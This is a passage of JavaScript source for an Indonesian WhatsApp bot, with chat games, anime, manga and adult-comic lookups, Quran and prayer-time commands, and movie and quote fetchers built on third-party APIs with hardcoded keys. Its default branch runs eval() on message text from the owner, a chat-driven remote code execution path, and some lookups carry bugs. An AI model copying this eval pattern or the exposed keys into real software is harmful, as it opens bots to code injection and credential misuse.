					Repor.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					Repor.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					Repor.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					Repor.sendMessage(from, caklontong, text, {quoted: revz}) // ur cods
					}, 0) // 1000 = 1s,
					break
					case prefix+ 'suit': //nyolong dari zenz
                if (!q) return reply(`Kirim perintah ${prefix}suit gunting / batu / kertas`)
                const userspilih = q
                if (!userspilih.match(/batu|gunting|kertas/)) return reply(`Pilih batu, kertas, gunting`)
                var computer = Math.random();
                if (computer < 0.34 ) {
                    computer = 'batu';
                } else if( computer >= 0.34 && computer < 0.67) {
                    computer = 'gunting';
                } else {
                    computer = 'kertas';
                }
                if ( userspilih == computer ) {
                    reply(`Pertandingan Seri!`)
                } else if ( userspilih == 'batu' ) {
                    if( computer == 'gunting' ) {
                        // hasil = 'MENANG';
                        reply(`Kamu memilih Batu dan bot Gunting\nKamu menang!`)
                    } else {
                        reply(`Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!`)
                    }
                } else if ( userspilih == 'gunting' ) {
                    if( computer == 'batu' ) {
                        // hasil = 'MENANG';
                        reply(`Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!`)
                    } else {
                        reply(`Kamu memilih Gunting dan bot Kertas\nKamu menang!`)
                    }
                } else if ( userspilih == 'kertas' ) {
                    if( computer == 'batu' ) {
                        // hasil = 'MENANG';
                        reply(`Kamu memilih Kertas dan bot Batu\nKamu menang!`)
                    } else {
                        reply(`Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah`)
                    }
                    }
            break
            case prefix+ 'slot':
            const sotoy = [
		'🍊 : 🍒 : 🍐',
		'🍒 : ?? : 🍊',
		'?? : 🍒 : 🍐',
		'🍊 : 🍋 : 🔔',
		'🔔 : 🍒 : 🍐',
		'🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',		
		'🍐 : 🍒 : 🍋',
		'🍐 : 🍐 : 🍐',
		'🍊 : 🍒 : 🍒',
		'🔔 : 🔔 : 🍇',
		'🍌 : 🍒 : 🔔',
		'🍐 : 🔔 : 🔔',
		'🍊 : 🍋 : 🍒',
		'🍋 : 🍋 : 🍌',
		'🔔 : 🔔 : 🍇',
		'🔔 : 🍐 : 🍇',
		'🔔 : 🔔 : 🔔',
		'🍒 : ?? : 🍒',
		'🍌 : 🍌 : 🍌',
		'🍇 : ?? : 🍇'
		]
                somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
                somtoyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
                somtoyyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
                if (somtoyy  == '🍌 : 🍌 : 🍌') {
	     	    reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
	     	    } else if (somtoyy == '🍒 : 🍒 : 🍒') {
	     	    reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
	     	    } else if (somtoyy == '🔔 : 🔔 : 🔔') {
	     	    reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
	     	    } else if (somtoyy == '?? : 🍐 : 🍐') {
	     	    reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
	     	    } else if (somtoyy == '🍇 : 🍇 : 🍇') {
	     	    reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
	     	    } else {
	     	    reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU LOSE*  ]`)
	     	    }
	        break
	case prefix+ 'tebakanime':
			anu = await fetchJson(`https://x-restapi.herokuapp.com/api/tebak-anime?apikey=BETA`, {method: 'get'})
			anime = await getBuffer(anu.soal)
			setTimeout( () => {
			reply('*➸ Jawaban :* '+anu.jawaban, text, {quoted: revz}) // ur cods
			}, 30000) // 1000 = 1s,
			setTimeout( () => {
			reply('_10 Detik lagi…_', text) // ur cods
			}, 20000) // 1000 = 1s,
			setTimeout( () => {
			reply('_20 Detik lagi_…', text) // ur cods
			}, 10000) // 1000 = 1s,
			setTimeout( () => {
			reply('_30 Detik lagi_…', text) // ur cods
			}, 2500) // 1000 = 1s,
			setTimeout( () => {
			Repor.sendMessage(from, anime, image, {quoted: revz }) // ur cods
			}, 0) // 1000 = 1s,
			break
			case prefix+ 'bisakah':
				    bisakah = body.slice(1)
					const bisa =['Bisa','Tidak Bisa','Coba Ulangi']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					Repor.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: revz })
					break
             case prefix+ 'kapankah':
					kapankah = body.slice(1)
					const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','Yo ndak tau kok tanya saya','3 Hari Lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					Repor.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: revz })
					break
           case prefix+ 'apakah':
					apakah = body.slice(1)
					const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					Repor.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: revz })
					break
				case prefix+ 'rate':
					rate = body.slice(1)
					const ra =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
					const te = ra[Math.floor(Math.random() * ra.length)]
					Repor.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: revz })
					break
				case prefix+ 'truth':
                const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
					const ttrth = trut[Math.floor(Math.random() * trut.length)]
					truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					Repor.sendMessage(from, truteh, image, { caption: '*Truth*\n\n'+ ttrth, quoted: revz })
					break
				case prefix+ 'dare':
				const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄??" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
					const der = dare[Math.floor(Math.random() * dare.length)]
					tod = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					Repor.sendMessage(from, tod, image, { quoted: revz, caption: '*Dare*\n\n'+ der })
					break

			//********** ANIME MENU **********//
			case prefix+ 'topanime':

anu = await fetchJson('https://x-restapi.herokuapp.com/api/topanime?apikey=BETA')
teks = '- - - - - [ *Top Anime* ] - - - - - '
var hhhh = '1'
for (let i = 0; i < anu.data.length; i++) {
teks += `\n\n*Rank ${hhhh}*\nJudul : ${anu.data[i].Judul}\nSkor : ${anu.data[i].Score}\nInfo : ${anu.data[i]. Informasi}\nLink : ${anu.data[i].Link}`
hhhh++
}
reply(teks)
                break
               case prefix+ 'topmanga':

anu = await fetchJson('https://x-restapi.herokuapp.com/api/topmanga?apikey=BETA')
teks = '- - - - - [ *Top Manga* ] - - - - -'
var hhhh = '1'
for (let i = 0; i < anu.data.length; i++) {
teks += `\n\n*Rank ${hhhh}*\nJudul : ${anu.data[i].Judul}\nSkor : ${anu.data[i].Score}\nInfo : ${anu.data[i]. Informasi}\nLink : ${anu.data[i].Link}`
hhhh++
}
reply(teks)
                break
                case prefix+ 'topmale':

anu = await fetchJson('https://lindow-api.herokuapp.com/api/anitopmale?apikey=LindowApi')
teks = '- - - - - [ *Top Male* ] - - - - -'
var hhhh = '1'
for (let i = 0; i < anu.data.length; i++) {
teks += `\n\n*Rank ${hhhh}*\nJudul : ${anu.data[i].Judul}\nSkor : ${anu.data[i].Score}\nInfo : ${anu.data[i]. Informasi}\nLink : ${anu.data[i].Link}`
hhhh++
}
reply(teks)
                break
                case prefix+ 'topfemale':

anu = await fetchJson('https://lindow-api.herokuapp.com/api/anitopfemale?apikey=LindowApi')
teks = '- - - - - [ *Top Female* ] - - - - -'
var hhhh = '1'
for (let i = 0; i < anu.data.length; i++) {
teks += `\n\n*Rank ${hhhh}*\nJudul : ${anu.data[i].Judul}\nSkor : ${anu.data[i].Score}\nInfo : ${anu.data[i]. Informasi}\nLink : ${anu.data[i].Link}`
hhhh++
}
reply(teks)
                break
               case prefix+ 'samehadaku':
			query = args.join(" ")
                    get_result = await fetchJson(`https://x-restapi.herokuapp.com/api/samehadaku-search?q=${nm}&apikey=BETA`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Link :\n${get_result.url}\n`
                    thumbnail = await getBuffer(get_result.image)
                    Repor.sendMessage(from, thumbnail, image, { quoted: revz, caption: ini_txt })
                    break
                    case prefix+ 'mangatoon':
			query = args.join(" ")
                    get_result = await fetchJson(`https://x-restapi.herokuapp.com/api/mangatoon-search?q=${nm}&apikey=BETA`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Genre : ${get_result.type}\n`
                    ini_txt += `Link :\n${get_result.url}\n`
                    thumbnail = await getBuffer(get_result.image)
                    Repor.sendMessage(from, thumbnail, image, { quoted: revz, caption: ini_txt })
                    break
                    case prefix+ 'otakudesu':

                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/otakudesusearch?apikey=${LolKey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Judul : ${get_result.judul}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Episode : ${get_result.episodes}\n`
                    ini_txt += `Aired : ${get_result.aired}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Genre : ${get_result.genres}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Studios : ${get_result.status}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Credit : ${get_result.credit}\n`
                    get_link = get_result.link_dl
                    for (var x in get_link) {
                        ini_txt += `\n\n*${get_link[x].title}*\n`
                        for (var y in get_link[x].link_dl) {
                            ini_info = get_link[x].link_dl[y]
                            ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
                            ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
                            ini_txt += `\`\`\`Link : \`\`\`\n`
                            down_link = ini_info.link_dl
                            for (var z in down_link) {
                                ini_txt += `${z} - ${down_link[z]}\n`
                            }
                        }
                    }
                    reply(ini_txt)
                    break
                   case prefix+ 'kusonime':
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/kusonimesearch?apikey=${LolKey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Seasons : ${get_result.seasons}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Total Episode : ${get_result.total_episode}\n`
                    ini_txt += `Score : ${get_result.score}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Released On : ${get_result.released_on}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    link_dl = get_result.link_dl
                    for (var x in link_dl) {
                        ini_txt += `\n${x}\n`
                        for (var y in link_dl[x]) {
                            ini_txt += `${y} - ${link_dl[x][y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    Repor.sendMessage(from, ini_buffer, image, { quoted: revz, caption: ini_txt })
                    break
                   case prefix+ 'nhentai':
		
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} 12345`)
                    henid = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = `Title Romaji : ${get_result.title_romaji}\n`
                    ini_txt += `Title Native : ${get_result.title_native}\n`
                    ini_txt += `Read Online : ${get_result.read}\n`
                    get_info = get_result.info
                    ini_txt += `Parodies : ${get_info.parodies}\n`
                    ini_txt += `Character : ${get_info.characters.join(", ")}\n`
                    ini_txt += `Tags : ${get_info.tags.join(", ")}\n`
                    ini_txt += `Artist : ${get_info.artists}\n`
                    ini_txt += `Group : ${get_info.groups}\n`
                    ini_txt += `Languager : ${get_info.languages.join(", ")}\n`
                    ini_txt += `Categories : ${get_info.categories}\n`
                    ini_txt += `Pages : ${get_info.pages}\n`
                    ini_txt += `Uploaded : ${get_info.uploaded}\n`
                    reply(ini_txt)
                    break
                case prefix+ 'nhentaipdf':
		

                    if (args.length == 0) return reply(`Example: ${prefix + command} 12345`)
                    henid = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_buffer = await getBuffer(get_result)
                    Repor.sendMessage(from, ini_buffer, document, { quoted: revz, mimetype: Mimetype.pdf, filename: `${henid}.pdf` })
                    break
                case prefix+ 'nhentaisearch':
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/nhentaisearch?apikey=${LolKey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = "Result : \n"
                    for (var x of get_result) {
                        ini_txt += `Id : ${x.id}\n`
                        ini_txt += `Title English : ${x.title_english}\n`
                        ini_txt += `Title Japanese : ${x.title_japanese}\n`
                        ini_txt += `Native : ${x.title_native}\n`
                        ini_txt += `Upload : ${x.date_upload}\n`
                        ini_txt += `Page : ${x.page}\n`
                        ini_txt += `Favourite : ${x.favourite}\n\n`
                    }
                    reply(ini_txt)
                    break
                    case prefix+ 'character':
		            if (args.length == 0) return reply(`Example: ${prefix + command} Chika Fujiwara`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/character?apikey=${LolKey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Name : ${get_result.name.full}\n`
                    ini_txt += `Native : ${get_result.name.native}\n`
                    ini_txt += `Favorites : ${get_result.favourites}\n`
                    ini_txt += `Media : \n`
                    ini_media = get_result.media.nodes
                    for (var x of ini_media) {
                        ini_txt += `- ${x.title.romaji} (${x.title.native})\n`
                    }
                    ini_txt += `\nDescription : \n${get_result.description.replace(/__/g, "_")}`
                    thumbnail = await getBuffer(get_result.image.large)
                    Repor.sendMessage(from, thumbnail, image, { quoted: revz, caption: ini_txt })
                    break
        case prefix+ 'husbu':
        reply(`Sedang Proses...`)
        buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/husbu?apikey=${LolKey}`)
                    Repor.sendMessage(from, buffer, image, { quoted: revz, contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
                    break
        case prefix+ 'waifu':
        reply(`Sedang Proses...`)
        buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/waifu?apikey=${LolKey}`)
                    Repor.sendMessage(from, buffer, image, { quoted: revz, contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
                    break
       case prefix+ 'loli':
       reply(`Sedang Proses...`)
        buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/loli?apikey=${LolKey}`)
                    Repor.sendMessage(from, buffer, image, { quoted: revz, contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
                    break
       case prefix+ 'neko':
       reply(`Sedang Proses...`)
        buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/neko?apikey=${LolKey}`)
                    Repor.sendMessage(from, buffer, image, { quoted: revz, contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
                    break
                    
                    //********** PRAY MENU **********//
                    case prefix+ 'listsurah':
		
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/quran?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = 'List Surah:\n'
                    for (var x in get_result) {
                        ini_txt += `${x}. ${get_result[x]}\n`
                    }
                    reply(ini_txt)
                    break
                case prefix+ 'alquran':
		
                    if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
                    urls = `http://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${LolKey}`
                    quran = await fetchJson(urls)
                    result = quran.result
                    ayat = result.ayat
                    ini_txt = `QS. ${result.surah} : 1-${ayat.length}\n\n`
                    for (var x of ayat) {
                        arab = x.arab
                        nomor = x.ayat
                        latin = x.latin
                        indo = x.indonesia
                        ini_txt += `${arab}\n${nomor}. ${latin}\n${indo}\n\n`
                    }
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    ini_txt = ini_txt.replace(/<strong>/g, "").replace(/<\/strong>/g, "")
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    reply(ini_txt)
                    break
                case prefix+ 'alquranaudio':
		
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
                    surah = args[0]
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=${LolKey}`)
                    Repor.sendMessage(from, ini_buffer, audio, { quoted: revz, mimetype: Mimetype.mp4Audio })
                    break
                case prefix+ 'asmaulhusna':
		
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/asmaulhusna?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = `No : ${get_result.index}\n`
                    ini_txt += `Latin: ${get_result.latin}\n`
                    ini_txt += `Arab : ${get_result.ar}\n`
                    ini_txt += `Indonesia : ${get_result.id}\n`
                    ini_txt += `English : ${get_result.en}`
                    reply(ini_txt)
                    break
                case prefix+ 'kisahnabi':
		
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = `Name : ${get_result.name}\n`
                    ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`
                    ini_txt += `Umur : ${get_result.age}\n`
                    ini_txt += `Tempat : ${get_result.place}\n`
                    ini_txt += `Story : \n${get_result.story}`
                    reply(ini_txt)
                    break
                case prefix+ 'jadwalsholat':
		
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = `Wilayah : ${get_result.wilayah}\n`
                    ini_txt += `Tanggal : ${get_result.tanggal}\n`
                    ini_txt += `Sahur : ${get_result.sahur}\n`
                    ini_txt += `Imsak : ${get_result.imsak}\n`
                    ini_txt += `Subuh : ${get_result.subuh}\n`
                    ini_txt += `Terbit : ${get_result.terbit}\n`
                    ini_txt += `Dhuha : ${get_result.dhuha}\n`
                    ini_txt += `Dzuhur : ${get_result.dzuhur}\n`
                    ini_txt += `Ashar : ${get_result.ashar}\n`
                    ini_txt += `Maghrib : ${get_result.imsak}\n`
                    ini_txt += `Isya : ${get_result.isya}`
                    reply(ini_txt)
                    break
                   
                   //********** MOVIE MENU **********//
                    case prefix+ 'lk21':
                    case prefix+ 'film':
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} Transformer`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/lk21?apikey=${LolKey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Link : ${get_result.link}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Views : ${get_result.views}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Tahun : ${get_result.tahun}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Actors : ${get_result.actors.join(", ")}\n`
                    ini_txt += `Location : ${get_result.location}\n`
                    ini_txt += `Date Release : ${get_result.date_release}\n`
                    ini_txt += `Language : ${get_result.language}\n`
                    ini_txt += `Link Download : ${get_result.link_dl}`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    Repor.sendMessage(from, thumbnail, image, { quoted: revz, caption: ini_txt })
                    break
                case prefix+ 'drakorongoing':
		
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/drakorongoing?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = "Ongoing Drakor\n\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n`
                        ini_txt += `Year : ${x.category}\n`
                        ini_txt += `Total Episode : ${x.total_episode}\n`
                        ini_txt += `Genre : ${x.genre.join(", ")}\n\n`
                    }
                    reply(ini_txt)
                    break
                case prefix+ 'wattpad':
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.wattpad.com/707367860-kumpulan-quote-tere-liye-tere-liye-quote-quote`)
                    ini_url = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wattpad?apikey=${LolKey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Motify date : ${get_result.modifyDate}\n`
                    ini_txt += `Create date: ${get_result.createDate}\n`
                    ini_txt += `Word : ${get_result.word}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Vote : ${get_result.vote}\n`
                    ini_txt += `Reader : ${get_result.reader}\n`
                    ini_txt += `Pages : ${get_result.pages}\n`
                    ini_txt += `Description : ${get_result.desc}\n\n`
                    ini_txt += `Story : \n${get_result.story}`
                    thumbnail = await getBuffer(get_result.photo)
                    Repor.sendMessage(from, thumbnail, image, { quoted: revz, caption: ini_txt })
                    break
                case prefix+ 'wattpadsearch':
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} Tere Liye`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wattpadsearch?apikey=${LolKey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = "Wattpad Seach : \n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Part : ${x.parts}\n`
                        ini_txt += `Motify date : ${x.modifyDate}\n`
                        ini_txt += `Create date: ${x.createDate}\n`
                        ini_txt += `Coment count: ${x.commentCount}\n\n`
                    }
                    reply(ini_txt)
                    break
                case prefix+ 'cerpen':
		
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cerpen?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Creator : ${get_result.creator}\n`
                    ini_txt += `Story :\n${get_result.cerpen}`
                    reply(ini_txt)
                    break
                case prefix+ 'ceritahoror':
		
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ceritahoror?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Story :\n${get_result.story}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    Repor.sendMessage(from, thumbnail, image, { quoted: revz, caption: ini_txt })
                    break
                  
                  //********** RANDOM MENU **********//
                   case prefix+ 'quotes':
		
                    quotes = await fetchJson(`http://api.lolhuman.xyz/api/random/quotes?apikey=${LolKey}`)
                    quotes = quotes.result
                    author = quotes.by
                    quotes = quotes.quote
                    reply(`_${quotes}_\n\n*― ${author}*`)
                    break
                    case prefix+ 'quotesislami':
                    
                    quotes = await fetchJson(`http://api.lolhuman.xyz/api/random/quotes?apikey=${LolKey}`)
                    quotes = quotes.result
                    reply(`_${quotes}_`)
                    break
                    case prefix+ 'quotesislami':
                    anu = await fetchJson(`http://api.lolhuman.xyz/api/random/quotes?apikey=${LolKey}`, {method: 'get'})
					qim = `Quotes: *${anu.result}*`
					Repor.sendMessage(from, qim, text, {quoted: revz})
					 break
					
                case prefix+ 'quotesanime':
		
		
                    quotes = await fetchJson(`http://api.lolhuman.xyz/api/random/quotesnime?apikey=${LolKey}`)
                    quotes = quotes.result
                    quote = quotes.quote
                    char = quotes.character
                    anime = quotes.anime
                    episode = quotes.episode
                    reply(`_${quote}_\n\n*― ${char}*\n*― ${anime} ${episode}*`)
                    break
                case prefix+ 'quotesdilan':
		
                    quotedilan = await fetchJson(`http://api.lolhuman.xyz/api/quotes/dilan?apikey=${LolKey}`)
                    reply(quotedilan.result)
                    break
                case prefix+ 'quotesimage':
		
		buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/random/quotesimage?apikey=KatoNiBoss`)
		Repor.sendMessage(from, buffer, image, { quoted: revz})
		break
                case prefix+ 'faktaunik':
                case prefix+ 'katabijak':
                case prefix+ 'pantun':
                case prefix+ 'bucin':
		
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/random/${command}?apikey=${LolKey}`)
                    reply(get_result.result)
                    break
                case prefix+ 'randomnama':
		
                    anu = await fetchJson(`http://api.lolhuman.xyz/api/random/nama?apikey=${LolKey}`)
                    reply(anu.result)
                    break
                   
                   
                   
                    
/////*******************************************************************************************************************************************************************************************************************************************
				default:
				if (budy.includes('@994404819287')){
				AjgTag = fs.readFileSync('./media/ditag.webp')
				Repor.sendMessage(from, AjgTag, Sticker)
				}
                if (budy.startsWith('x')){
                try {
                if(!isOwner && !revz.key.fromMe) return
                return Repor.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: revz})
                } catch(err) {
                e = String(err)
                reply(e)
                }
                }
					if (isGroup && isSimi && budy != undefined) {
						console.log(budy)
						muehe = await simih(budy)
						console.log(muehe)
						reply(muehe)
					} else {
						return //console.log(color('[WARN]','red'), 'Unregistered Command from', color(sender.split('@')[0]))
					}
                           }
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
}

starts()
